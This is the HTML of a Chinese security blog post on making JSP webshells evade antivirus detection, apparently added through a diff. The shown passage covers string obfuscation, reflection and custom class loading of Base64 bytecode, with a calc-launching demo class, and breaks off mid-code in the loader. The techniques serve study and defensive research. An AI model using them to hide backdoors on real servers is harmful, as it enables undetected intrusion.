@@ -1,0 +1,975 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>WebShell免杀之JSP - </title><meta name="Description" content="WebShell免杀之JSP"><meta property="og:title" content="WebShell免杀之JSP" />
+<meta property="og:description" content="WebShell免杀之JSP" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/webshell-bypass-jsp/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-02-01T18:44:42+00:00" />
+<meta property="article:modified_time" content="2020-02-01T18:44:42+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="WebShell免杀之JSP"/>
+<meta name="twitter:description" content="WebShell免杀之JSP"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/webshell-bypass-jsp/" /><link rel="prev" href="https://yzddmr6.com/posts/antsword-diy-1/" /><link rel="next" href="https://yzddmr6.com/posts/jsp-classload-backdoor/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "WebShell免杀之JSP",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/webshell-bypass-jsp\/"
+        },"genre": "posts","keywords": "webshell, 免杀","wordcount":  3089 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/webshell-bypass-jsp\/","datePublished": "2020-02-01T18:44:42+00:00","dateModified": "2020-02-01T18:44:42+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": "WebShell免杀之JSP"
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#基础知识">基础知识</a>
+      <ul>
+        <li><a href="#jsp标签">JSP标签</a></li>
+        <li><a href="#jsp中的字符串混淆方式">JSP中的字符串混淆方式</a>
+          <ul>
+            <li><a href="#ascii">ASCII</a></li>
+            <li><a href="#hex">HEX</a></li>
+            <li><a href="#base64">BASE64</a></li>
+          </ul>
+        </li>
+        <li><a href="#类反射">类反射</a>
+          <ul>
+            <li><a href="#使用反射调用对象方法的步骤">使用反射调用对象方法的步骤</a></li>
+          </ul>
+        </li>
+        <li><a href="#类加载">类加载</a></li>
+      </ul>
+    </li>
+    <li><a href="#对命令执行jsp一句话免杀">对命令执行JSP一句话免杀</a>
+      <ul>
+        <li><a href="#原型">原型</a></li>
+        <li><a href="#类反射绕过">类反射绕过</a></li>
+        <li><a href="#寻找其他类">寻找其他类</a></li>
+      </ul>
+    </li>
+    <li><a href="#对于冰蝎jsp一句话的免杀">对于冰蝎JSP一句话的免杀</a>
+      <ul>
+        <li><a href="#免杀d盾">免杀D盾</a></li>
+        <li><a href="#免杀百度scanner">免杀百度scanner</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">WebShell免杀之JSP</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-02-01">2020-02-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2020-02-01">2020-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3089 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#基础知识">基础知识</a>
+      <ul>
+        <li><a href="#jsp标签">JSP标签</a></li>
+        <li><a href="#jsp中的字符串混淆方式">JSP中的字符串混淆方式</a>
+          <ul>
+            <li><a href="#ascii">ASCII</a></li>
+            <li><a href="#hex">HEX</a></li>
+            <li><a href="#base64">BASE64</a></li>
+          </ul>
+        </li>
+        <li><a href="#类反射">类反射</a>
+          <ul>
+            <li><a href="#使用反射调用对象方法的步骤">使用反射调用对象方法的步骤</a></li>
+          </ul>
+        </li>
+        <li><a href="#类加载">类加载</a></li>
+      </ul>
+    </li>
+    <li><a href="#对命令执行jsp一句话免杀">对命令执行JSP一句话免杀</a>
+      <ul>
+        <li><a href="#原型">原型</a></li>
+        <li><a href="#类反射绕过">类反射绕过</a></li>
+        <li><a href="#寻找其他类">寻找其他类</a></li>
+      </ul>
+    </li>
+    <li><a href="#对于冰蝎jsp一句话的免杀">对于冰蝎JSP一句话的免杀</a>
+      <ul>
+        <li><a href="#免杀d盾">免杀D盾</a></li>
+        <li><a href="#免杀百度scanner">免杀百度scanner</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>其他类型的webshell容易免杀的一个主要原因是有eval函数，能够把我们的加密几层后的payload进行解密然后用eval执行，从而绕过杀软的检测。</p>
+<p>然而由于JSP的语法没有所谓的eval函数，不像php等语言那么灵活，变形困难，所以JSP的免杀马比较少，相关的文章也比较少。</p>
+<p>能找到的公开文章中，LandGrey大佬的<a href="https://xz.aliyun.com/t/2342" target="_blank" rel="noopener noreferrer">这一篇文章</a>写的非常好，利用Java反射机制和Java类加载机制来构造免杀的JSP后门。</p>
+<p>但是文章中部分细节仅为一笔带过，对于没有学过JAVA的同学不太友好。并且这篇文章写在冰蝎出现之前，没有对冰蝎JSPshell免杀的相关内容。所以今天这篇文章就跟大家一起分享一下JSP的免杀姿势。</p>
+<h2 id="基础知识" class="headerLink">
+    <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="header-mark"></a>2 基础知识</h2><h3 id="jsp标签" class="headerLink">
+    <a href="#jsp%e6%a0%87%e7%ad%be" class="header-mark"></a>2.1 JSP标签</h3><p>在JSP页面中嵌入java代码，首先要了解一下JSP标签的基本知识。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ %&gt;    页面指令，设定页面属性和特征信息
+</span></span><span class="line"><span class="cl">&lt;% %&gt;     java代码片段，不能在此声明方法
+</span></span><span class="line"><span class="cl">&lt;%! %&gt;    java代码声明，声明全局变量或当前页面的方法
+</span></span><span class="line"><span class="cl">&lt;%= %&gt;    Java表达式
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="jsp中的字符串混淆方式" class="headerLink">
+    <a href="#jsp%e4%b8%ad%e7%9a%84%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%b7%b7%e6%b7%86%e6%96%b9%e5%bc%8f" class="header-mark"></a>2.2 JSP中的字符串混淆方式</h3><h4 id="ascii" class="headerLink">
+    <a href="#ascii" class="header-mark"></a>2.2.1 ASCII</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">String a=new String(new byte[] { 121, 122, 100, 100, 77, 114, 54 });
+</span></span><span class="line"><span class="cl">	System.out.println(&#34;ASCII: &#34;+a);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="hex" class="headerLink">
+    <a href="#hex" class="header-mark"></a>2.2.2 HEX</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import javax.xml.bind.DatatypeConverter;
+</span></span><span class="line"><span class="cl">      String b= new String(DatatypeConverter.parseHexBinary(&#34;797a64644d7236&#34;));
+</span></span><span class="line"><span class="cl">      System.out.println(&#34;HEX: &#34;+b);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="base64" class="headerLink">
+    <a href="#base64" class="header-mark"></a>2.2.3 BASE64</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import sun.misc.BASE64Decoder;
+</span></span><span class="line"><span class="cl">    String c = new String(new BASE64Decoder().decodeBuffer(&#34;eXpkZE1yNg==&#34;));
+</span></span><span class="line"><span class="cl">    System.out.println(&#34;BASE64: &#34;+c);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428381-9770abbb-879b-47a6-957a-4020c8120607.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428381-9770abbb-879b-47a6-957a-4020c8120607.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428381-9770abbb-879b-47a6-957a-4020c8120607.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428381-9770abbb-879b-47a6-957a-4020c8120607.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428381-9770abbb-879b-47a6-957a-4020c8120607.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428381-9770abbb-879b-47a6-957a-4020c8120607.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="类反射" class="headerLink">
+    <a href="#%e7%b1%bb%e5%8f%8d%e5%b0%84" class="header-mark"></a>2.3 类反射</h3><p>首先要知道为什么免杀需要用到类反射</p>
+<p><strong>类反射可以把我们想要调用的函数或者类的名字放到一个字符串的位置。</strong></p>
+<p>此时也就相当于我们实现了php中的变量函数，就可以利用base64编码或者hex编码等来混淆关键函数。</p>
+<p>例子参考<a href="https:_www.cnblogs.com_chanshuyi_p_head_first_of_reflection" rel="">大白话说Java反射</a></p>
+<h4 id="使用反射调用对象方法的步骤" class="headerLink">
+    <a href="#%e4%bd%bf%e7%94%a8%e5%8f%8d%e5%b0%84%e8%b0%83%e7%94%a8%e5%af%b9%e8%b1%a1%e6%96%b9%e6%b3%95%e7%9a%84%e6%ad%a5%e9%aa%a4" class="header-mark"></a>2.3.1 使用反射调用对象方法的步骤</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Class clz = Class.forName(&#34;test.Apple&#34;); // 获取类的 Class 对象实例
+</span></span><span class="line"><span class="cl">Constructor appleConstructor = clz.getConstructor(); // 根据 Class 对象实例获取 Constructor 对象
+</span></span><span class="line"><span class="cl">Object appleObj = appleConstructor.newInstance();// 使用 Constructor 对象的 newInstance 方法获取反射类对象
+</span></span><span class="line"><span class="cl">Method setPriceMethod = clz.getMethod(&#34;setPrice&#34;, int.class); // 获取方法的 Method 对象
+</span></span><span class="line"><span class="cl">setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果没有构造函数的情况下就更简单了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Class clz = Class.forName(&#34;test.Apple&#34;); // 获取类的 Class 对象实例
+</span></span><span class="line"><span class="cl">Object appleObj=clz.newInstance();// 直接获得clz类的一个实例化对象
+</span></span><span class="line"><span class="cl">Method setPriceMethod = clz.getMethod(&#34;setPrice&#34;, int.class); // 获取方法的 Method 对象
+</span></span><span class="line"><span class="cl">setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428491-64ccefe4-d2ad-4044-9efb-2dfd49af1889.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428491-64ccefe4-d2ad-4044-9efb-2dfd49af1889.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428491-64ccefe4-d2ad-4044-9efb-2dfd49af1889.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428491-64ccefe4-d2ad-4044-9efb-2dfd49af1889.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428491-64ccefe4-d2ad-4044-9efb-2dfd49af1889.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428491-64ccefe4-d2ad-4044-9efb-2dfd49af1889.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>从图中可以看到，我们用类反射调用了Apple类中的setPrice跟getPrice方法。</p>
+<p>其实也可以压缩一下写成一行的形式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Class.forName(&#34;test.Apple&#34;).getMethod(&#34;setPrice&#34;, int.class).invoke(Class.forName(&#34;test.Apple&#34;).newInstance(),20);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不过当然正常人是不会这么写的。</p>
+<h3 id="类加载" class="headerLink">
+    <a href="#%e7%b1%bb%e5%8a%a0%e8%bd%bd" class="header-mark"></a>2.4 类加载</h3><p>在LandGrey大佬的文章中提到的类加载的意思是将获得Class对象的方式由</p>
+<p>Class rt= Class.forName(&ldquo;java.lang.Runtime&rdquo;); 改成</p>
+<p>Class rt = ClassLoader.getSystemClassLoader().loadClass(&ldquo;java.lang.Runtime&rdquo;);的形式。</p>
+<p>但是冰蝎作者在<a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener noreferrer">利用动态二进制加密实现新型一句话木马之Java篇</a>中对于类加载是直接传送二进制字节码。</p>
+<p>这也是为什么冰蝎能够实现不到1KB的JSP一句话的原因：<strong>冰蝎可以做到动态解析二进制class字节码。</strong></p>
+<p>学过java的同学应该都知道，java执行代码的时候都要先编译生成.class字节码文件，才能被jvm所执行。</p>
+<p>那么也就是说，如果我们能够实现任意class文件的加载，也就相当于实现了php中的eval函数。</p>
+<p>我们就用冰蝎中的例子</p>
+<p>首先写一个命令执行的类，调一个calc，但是我们不写主函数，也就是说我们先不让他运行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">IOException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">calc</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">String</span> <span class="nf">toString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">Runtime</span><span class="p">.</span><span class="nf">getRuntime</span><span class="p">().</span><span class="nf">exec</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="nf">catch</span> <span class="p">(</span><span class="nx">IOException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;OK&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在项目里生成之后，在out目录下可以看到编译好的二进制class文件。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428761-ea8dbfcf-abb8-465f-a0d1-43138b15fdd7.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428761-ea8dbfcf-abb8-465f-a0d1-43138b15fdd7.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428761-ea8dbfcf-abb8-465f-a0d1-43138b15fdd7.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428761-ea8dbfcf-abb8-465f-a0d1-43138b15fdd7.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428761-ea8dbfcf-abb8-465f-a0d1-43138b15fdd7.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428761-ea8dbfcf-abb8-465f-a0d1-43138b15fdd7.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>然后把它base64，保存到文件里，去除多余的换行</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428911-d0b2d108-e8d2-4599-ae87-43ec39551484.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428911-d0b2d108-e8d2-4599-ae87-43ec39551484.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428911-d0b2d108-e8d2-4599-ae87-43ec39551484.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428911-d0b2d108-e8d2-4599-ae87-43ec39551484.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428911-d0b2d108-e8d2-4599-ae87-43ec39551484.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428911-d0b2d108-e8d2-4599-ae87-43ec39551484.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>接着生成一个loader类，用于加载我们的class文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">sun</span><span class="p">.</span><span class="nx">misc</span><span class="p">.</span><span class="nx">BASE64Decoder</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">loader</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">class</span> <span class="nx">Myloader</span> <span class="nx">extends</span> <span class="nx">ClassLoader</span> <span class="c1">//继承ClassLoader
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span>  <span class="nx">Class</span> <span class="nf">get</span><span class="p">(</span><span class="kt">byte</span><span class="p">[]</span> <span class="nx">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">super</span><span class="p">.</span><span class="nf">defineClass</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">String</span> <span class="nx">classStr</span><span class="p">=</span><span class="s">&#34;xxxxxxxxxxxxxxxxx&#34;</span><span class="p">;</span> <span class="c1">// class的base64编码
